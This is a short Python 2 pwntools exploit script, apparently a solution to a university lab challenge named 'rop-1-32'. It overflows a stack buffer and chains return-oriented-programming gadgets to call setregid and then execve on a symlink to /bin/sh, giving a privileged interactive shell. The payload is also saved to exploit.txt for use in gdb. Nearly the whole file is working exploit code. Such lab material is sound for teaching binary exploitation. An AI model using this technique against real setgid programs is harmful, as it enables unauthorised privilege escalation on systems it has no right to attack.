#!/usr/bin/env python2

import os

# import pwntools
from pwn import *

env = {}

# prepare the program name and args
argv = [
        "./rop-1-32",
#    "/home/labs/week6/challenges/rop/rop-1-32",
]

p = process(argv, env=env)

setregid_addr = p.elf.symbols['setregid']
execve_addr = p.elf.symbols['execve']
string_addr = 0x8048641 # 0x18

#0x080486c8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
ppppr_addr = 0x80486c8
pppr_addr = 0x80486c9
ppr_addr = 0x80486ca
pr_addr = 0x80486cb

if os.path.exists("\x18"):
    os.unlink("\x18")
if not os.path.exists("\x18"):
    os.symlink("/bin/sh", "\x18")

# prepare an exploit string
# [dummy][setregid][pop-pop-ret][36001][36001][execve][XXXX][addr of "\xb8"][0][0]
exploit_string = "D"* (0x88 + 4) + \
    p32(setregid_addr) + p32(ppr_addr) + p32(50500) + p32(50500) + \
    p32(execve_addr) + p32(0) + p32(string_addr) + p32(0) + p32(0)


# Print your exploit as a txt file.
# You can use this in gdb, e.g.,
#   gdb-peda$ r < exploit.txt
with open("exploit.txt", "wb") as f:
    f.write(exploit_string)
    f.close()

# send the exploit
p.sendline(exploit_string)

# get an interactive pipe
print p.interactive()
